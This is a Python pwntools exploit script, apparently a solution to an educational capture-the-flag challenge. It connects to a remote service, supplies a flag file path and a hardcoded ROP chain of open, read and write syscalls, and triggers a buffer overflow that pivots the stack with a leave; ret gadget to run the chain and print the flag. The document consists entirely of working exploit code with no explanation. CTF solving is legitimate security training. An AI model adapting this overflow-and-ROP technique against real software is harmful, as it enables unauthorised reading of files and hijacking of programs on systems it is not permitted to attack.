from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
r = remote("edu-ctf.zoolab.org", "10005")

ROP_addr = 0x4e3360
fn = 0x4df460

pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_ret = 0x493a2b
pop_rax_ret = 0x45db87
syscall_ret = 0x4284b6
leave_ret = 0x40190c

ROP = flat(
    # open flag file
    pop_rdi_ret, fn,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    # read
    pop_rdi_ret, 3,
    pop_rsi_ret, fn,
    pop_rdx_ret, 0x30, 0,
    pop_rax_ret, 0,
    syscall_ret,

    # write
    pop_rdi_ret, 1,
    pop_rax_ret, 1,
    syscall_ret,
)

r.sendafter("Give me filename: ", '/home/chal/flag\x00')
r.sendafter("Give me ROP: ", b'A'*0x8 + ROP)
r.sendafter("Give me overflow: ", b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()